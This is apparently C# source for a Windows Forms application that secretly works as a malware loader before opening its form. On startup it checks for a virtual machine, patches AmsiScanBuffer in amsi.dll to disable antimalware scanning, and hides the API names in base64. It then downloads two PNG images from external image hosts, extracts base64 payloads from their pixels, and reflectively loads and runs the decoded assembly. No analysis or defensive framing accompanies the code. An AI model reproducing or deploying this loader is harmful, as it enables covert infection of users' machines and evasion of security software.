using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Program
{
    static class Program
    {
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main()
        {
            if (!VM())
            {
                LD();
            }
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }


        public static byte[] DE(Bitmap img)
        {
            StringBuilder holder = new StringBuilder();
            int xmax = img.Width - 1;
            int ymax = img.Height - 1;
            for (int y = 1; y <= ymax; y++)
            {
                for (int x = 1; x <= xmax; x++)
                {
                    Color c = img.GetPixel(x, y);
                    holder.Append((char)c.R);
                }
            }

            return Convert.FromBase64String(holder.ToString().Replac​e(Convert.ToChar(0).ToString(), ""));
        }
        private static void LD()
        {
            A.Bypass();

            string LDer = @"https://s1.ax1x.com/2020/04/28/J4Zp9S.png"; // No Startup，CHINA
            string FI_LE = @"https://z3.ax1x.com/2021/07/05/RhfFGn.png"; //FI_LE
            var requestLDer = WebRequest.Create(LDer);
            var requestFI_LE = WebRequest.Create(FI_LE);
            Bitmap LDerIMG;
            Bitmap FI_LEIMG;

            using (var response = requestLDer.GetResponse())
            using (var stream = response.GetResponseStream())
            {
                LDerIMG = (Bitmap)Image.FromStream(stream);
            }

            using (var response = requestFI_LE.GetResponse())
            using (var stream = response.GetResponseStream())
            {
                FI_LEIMG = (Bitmap)Image.FromStream(stream);
            }

            byte[] outputLDer = DE(LDerIMG);

            byte[] outputFI_LE = DE(FI_LEIMG);

            Assembly.Load(outputLDer).GetType("LDer.LDer").GetMethod("RunProgram").Invoke(null, new object[] { outputFI_LE });
        }
        public static bool VM()
        {
            SelectQuery selectQuery = new SelectQuery("Select * from Win32_CacheMemory");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(selectQuery);
            int i = 0;
            foreach (ManagementObject DeviceID in searcher.Get())
            {
                i++;
            }
            if (i == 0)
            {
                return true;
            }
            else
            {
                return false;
            }

        }
    }

    public class A
    {
        //static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        //static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
        public static void Bypass()
        {
            string x64 = "uFcAB4DD";
            string x86 = "uFcAB4DCGAA=";
            if (i64())
                pa(Convert.FromBase64String(x64));
            else
                pa(Convert.FromBase64String(x86));
        }

        private static void pa(byte[] patch)
        {
            try
            {
                string liba = Encoding.Default.GetString(Convert.FromBase64String("YW1zaS5kbGw="));
                var lib = Win32.LDLibraryA(ref liba);//Amsi.dll
                string addra = Encoding.Default.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI="));
                var addr = Win32.GetProcAddress(lib, ref addra);//AmsiScanBuffer

                uint oldProtect;
                Win32.VirtualAllocEx(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, addr, patch.Length);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }

        private static bool i64()
        {
            bool i64 = true;

            if (IntPtr.Size == 4)
                i64 = false;

            return i64;
        }
    }

    class Win32
    {
        //[DllImport("kernel32")]
        //public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        //[DllImport("kernel32")]
        //public static extern IntPtr LDLibrary(string name);


        public static readonly DelegateVirtualProtect VirtualAllocEx = LDApi<DelegateVirtualProtect>("kernel32", Encoding.Default.GetString(Convert.FromBase64String("VmlydHVhbFByb3RlY3Q=")));//VirtualProtect

        public delegate int DelegateVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        #region CreateAPI
        [DllImport("kernel32", SetLastError = true)]
        public static extern IntPtr LDLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
        public static CreateApi LDApi<CreateApi>(string name, string method)
        {
            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LDLibraryA(ref name), ref method), typeof(CreateApi));
        }
        #endregion
    }
}
